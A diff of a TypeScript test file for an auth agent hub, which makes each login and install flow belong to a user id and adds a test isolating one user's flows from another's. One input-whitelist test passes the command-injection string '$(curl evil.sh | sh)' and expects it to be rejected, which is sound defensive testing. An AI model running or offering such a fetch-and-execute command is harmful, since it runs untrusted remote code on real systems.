@@ -32,6 +32,10 @@ function push(kind: 'login' | 'install', v: ToolLoginView): string {
   return JSON.stringify({ op: 'view', kind, view: v })
 }
 
+/** Two users' ids. */
+const A = 'a0000000-0000-4000-8000-000000000001'
+const B = 'b0000000-0000-4000-8000-000000000002'
+
 /** Matches the hub's own linger window for a settled flow. */
 const LINGER_MS = 5 * 60 * 1000
 
@@ -48,9 +52,9 @@ describe('authAgentHub', () => {
   })
 
   it('refuses to start a flow until an agent connects', () => {
-    expect(authAgentHub.connected()).toBe(false)
+    expect(authAgentHub.connected(A)).toBe(false)
     try {
-      authAgentHub.startLogin('claude')
+      authAgentHub.startLogin(A, 'claude')
       expect.unreachable('started without an agent')
     } catch (err) {
       expect(err).toBeInstanceOf(ServerError)
@@ -59,50 +63,50 @@ describe('authAgentHub', () => {
     }
 
     const { sent, sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    expect(authAgentHub.connected()).toBe(true)
-    const v = authAgentHub.startLogin('claude')
+    authAgentHub.setSocket(A, sock)
+    expect(authAgentHub.connected(A)).toBe(true)
+    const v = authAgentHub.startLogin(A, 'claude')
     expect(v.status).toBe('running')
     expect(sent).toEqual([{ op: 'start', id: v.id, kind: 'login', tool: 'claude' }])
-    expect(authAgentHub.getLogin(v.id).status).toBe('running')
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('running')
   })
 
   it('relays a login end to end, then forgets it once the linger expires', () => {
     const { sent, sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    const v = authAgentHub.startLogin('claude')
+    authAgentHub.setSocket(A, sock)
+    const v = authAgentHub.startLogin(A, 'claude')
 
     // Progress pushes land on the polled view.
-    authAgentHub.ingest(push('login', view(v.id, 'running', { output: 'open https://…' })))
-    expect(authAgentHub.getLogin(v.id).output).toBe('open https://…')
+    authAgentHub.ingest(A, push('login', view(v.id, 'running', { output: 'open https://…' })))
+    expect(authAgentHub.getLogin(A, v.id).output).toBe('open https://…')
 
     // Paste input is whitelisted here as well as agent-side.
-    expect(() => authAgentHub.sendLoginInput(v.id, '$(curl evil.sh | sh)')).toThrow(ServerError)
-    authAgentHub.sendLoginInput(v.id, '  abc#DEF_123-  ')
+    expect(() => authAgentHub.sendLoginInput(A, v.id, '$(curl evil.sh | sh)')).toThrow(ServerError)
+    authAgentHub.sendLoginInput(A, v.id, '  abc#DEF_123-  ')
     expect(sent.at(-1)).toEqual({ op: 'input', id: v.id, text: 'abc#DEF_123-' })
 
     // A running flow arms no linger, so it stays pollable indefinitely.
     vi.advanceTimersByTime(LINGER_MS * 2)
-    expect(authAgentHub.getLogin(v.id).status).toBe('running')
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('running')
 
-    authAgentHub.ingest(push('login', view(v.id, 'success', { output: 'done' })))
-    expect(authAgentHub.getLogin(v.id).status).toBe('success')
+    authAgentHub.ingest(A, push('login', view(v.id, 'success', { output: 'done' })))
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('success')
     // Settled flows stop accepting input…
     try {
-      authAgentHub.sendLoginInput(v.id, 'abc')
+      authAgentHub.sendLoginInput(A, v.id, 'abc')
       expect.unreachable('accepted input on a terminal flow')
     } catch (err) {
       expect((err as ServerError).code).toBe('CONFLICT')
     }
     // …and are swept once the linger window passes.
     vi.advanceTimersByTime(LINGER_MS + 1)
-    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)
+    expect(() => authAgentHub.getLogin(A, v.id)).toThrow(/No sign-in session/)
   })
 
   it('drops frames it cannot parse or did not mint', () => {
     const { sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    const v = authAgentHub.startLogin('claude')
+    authAgentHub.setSocket(A, sock)
+    const v = authAgentHub.startLogin(A, 'claude')
 
     for (const raw of [
       'not json',
@@ -116,87 +120,114 @@ describe('authAgentHub', () => {
       push('login', view('not-minted', 'success')),                    // an id it never issued
       push('install', view(v.id, 'success')),                          // right id, wrong kind
     ]) {
-      authAgentHub.ingest(raw)
+      authAgentHub.ingest(A, raw)
     }
 
-    expect(authAgentHub.getLogin(v.id).status).toBe('running')
-    expect(() => authAgentHub.getLogin('not-minted')).toThrow(/No sign-in session/)
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('running')
+    expect(() => authAgentHub.getLogin(A, 'not-minted')).toThrow(/No sign-in session/)
   })
 
   it('cancels a settled flow, tells the agent, and ignores ids it does not own', () => {
     const { sent, sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    const v = authAgentHub.startLogin('claude')
+    authAgentHub.setSocket(A, sock)
+    const v = authAgentHub.startLogin(A, 'claude')
     // Settle it first so a linger is armed and cancel has a timer to clear.
-    authAgentHub.ingest(push('login', view(v.id, 'success')))
+    authAgentHub.ingest(A, push('login', view(v.id, 'success')))
 
-    authAgentHub.cancelLogin(v.id)
+    authAgentHub.cancelLogin(A, v.id)
     expect(sent.at(-1)).toEqual({ op: 'cancel', id: v.id, kind: 'login' })
-    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)
+    expect(() => authAgentHub.getLogin(A, v.id)).toThrow(/No sign-in session/)
 
     // Unknown ids and cross-kind cancels are no-ops — no op reaches the agent.
     const before = sent.length
-    authAgentHub.cancelLogin('ghost')
-    authAgentHub.cancelInstall('ghost')
-    const other = authAgentHub.startInstall('codex')
-    authAgentHub.cancelLogin(other.id)
-    expect(authAgentHub.getInstall(other.id).status).toBe('running')
+    authAgentHub.cancelLogin(A, 'ghost')
+    authAgentHub.cancelInstall(A, 'ghost')
+    const other = authAgentHub.startInstall(A, 'codex')
+    authAgentHub.cancelLogin(A, other.id)
+    expect(authAgentHub.getInstall(A, other.id).status).toBe('running')
     expect(sent.slice(before)).toEqual([{ op: 'start', id: other.id, kind: 'install', tool: 'codex' }])
 
     // Cancelling a flow that is still running — the common case, with no
     // linger yet armed — drops it just the same.
-    authAgentHub.cancelInstall(other.id)
+    authAgentHub.cancelInstall(A, other.id)
     expect(sent.at(-1)).toEqual({ op: 'cancel', id: other.id, kind: 'install' })
-    expect(() => authAgentHub.getInstall(other.id)).toThrow(/No install session/)
+    expect(() => authAgentHub.getInstall(A, other.id)).toThrow(/No install session/)
   })
 
   it('fails only the running flows when the agent disconnects', () => {
     const { sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    const settled = authAgentHub.startLogin('claude')
-    const running = authAgentHub.startLogin('codex')
-    authAgentHub.ingest(push('login', view(settled.id, 'success')))
+    authAgentHub.setSocket(A, sock)
+    const settled = authAgentHub.startLogin(A, 'claude')
+    const running = authAgentHub.startLogin(A, 'codex')
+    authAgentHub.ingest(A, push('login', view(settled.id, 'success')))
 
-    authAgentHub.handleDisconnect(sock)
-    expect(authAgentHub.connected()).toBe(false)
+    authAgentHub.handleDisconnect(A, sock)
+    expect(authAgentHub.connected(A)).toBe(false)
     // The agent kills its subprocesses on disconnect, so in-flight flows are
     // reported dead rather than left polling forever.
-    const after = authAgentHub.getLogin(running.id)
+    const after = authAgentHub.getLogin(A, running.id)
     expect(after.status).toBe('error')
     expect(after.error).toMatch(/disconnected/)
     // An already-settled flow keeps its result.
-    expect(authAgentHub.getLogin(settled.id).status).toBe('success')
+    expect(authAgentHub.getLogin(A, settled.id).status).toBe('success')
 
     // Cancelling with no agent attached still forgets the flow locally.
-    authAgentHub.cancelLogin(running.id)
-    expect(() => authAgentHub.getLogin(running.id)).toThrow(/No sign-in session/)
+    authAgentHub.cancelLogin(A, running.id)
+    expect(() => authAgentHub.getLogin(A, running.id)).toThrow(/No sign-in session/)
   })
 
   it('closes a replaced connection, which then cannot disconnect its successor', () => {
     const a = fakeSocket()
     const b = fakeSocket()
-    authAgentHub.setSocket(a.sock)
+    authAgentHub.setSocket(A, a.sock)
     // A close that throws (the socket is already gone) must not block takeover.
     a.close.mockImplementationOnce(() => { throw new Error('already closed') })
-    authAgentHub.setSocket(b.sock)
+    authAgentHub.setSocket(A, b.sock)
     expect(a.close).toHaveBeenCalled()
 
-    authAgentHub.handleDisconnect(a.sock)
-    expect(authAgentHub.connected()).toBe(true)
+    authAgentHub.handleDisconnect(A, a.sock)
+    expect(authAgentHub.connected(A)).toBe(true)
   })
 
   it('runs installs through the same shapes, keyed separately from logins', () => {
     const { sent, sock } = fakeSocket()
-    authAgentHub.setSocket(sock)
-    const v = authAgentHub.startInstall('codex')
+    authAgentHub.setSocket(A, sock)
+    const v = authAgentHub.startInstall(A, 'codex')
     expect(sent.at(-1)).toEqual({ op: 'start', id: v.id, kind: 'install', tool: 'codex' })
 
-    authAgentHub.ingest(push('install', view(v.id, 'success')))
-    expect(authAgentHub.getInstall(v.id).status).toBe('success')
-    expect(() => authAgentHub.getLogin(v.id)).toThrow(/No sign-in session/)
+    authAgentHub.ingest(A, push('install', view(v.id, 'success')))
+    expect(authAgentHub.getInstall(A, v.id).status).toBe('success')
+    expect(() => authAgentHub.getLogin(A, v.id)).toThrow(/No sign-in session/)
 
-    authAgentHub.cancelInstall(v.id)
+    authAgentHub.cancelInstall(A, v.id)
     expect(sent.at(-1)).toEqual({ op: 'cancel', id: v.id, kind: 'install' })
-    expect(() => authAgentHub.getInstall(v.id)).toThrow(/No install session/)
+    expect(() => authAgentHub.getInstall(A, v.id)).toThrow(/No install session/)
+  })
+
+  it('keeps each user to their own socket and flows', () => {
+    const a = fakeSocket()
+    const b = fakeSocket()
+    authAgentHub.setSocket(A, a.sock)
+    // A second user's connection replaces nothing of the first's.
+    authAgentHub.setSocket(B, b.sock)
+    expect(a.close).not.toHaveBeenCalled()
+    expect(authAgentHub.connected(A)).toBe(true)
+
+    const v = authAgentHub.startLogin(A, 'claude')
+    expect(b.sent).toEqual([])
+    // Another user can neither read, feed, nor cancel the flow: it is
+    // missing to them, so a pasted code never reaches their broker.
+    expect(() => authAgentHub.getLogin(B, v.id)).toThrow(/No sign-in session/)
+    expect(() => authAgentHub.sendLoginInput(B, v.id, 'code')).toThrow(/No sign-in session/)
+    authAgentHub.cancelLogin(B, v.id)
+    // Nor can their auth server push views into it.
+    authAgentHub.ingest(B, push('login', view(v.id, 'success')))
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('running')
+
+    // A user's disconnect fails only their own flows.
+    authAgentHub.handleDisconnect(B, b.sock)
+    expect(authAgentHub.getLogin(A, v.id).status).toBe('running')
+    expect(authAgentHub.connected(B)).toBe(false)
+    expect(() => authAgentHub.startLogin(B, 'claude')).toThrow(ServerError)
   })
 })
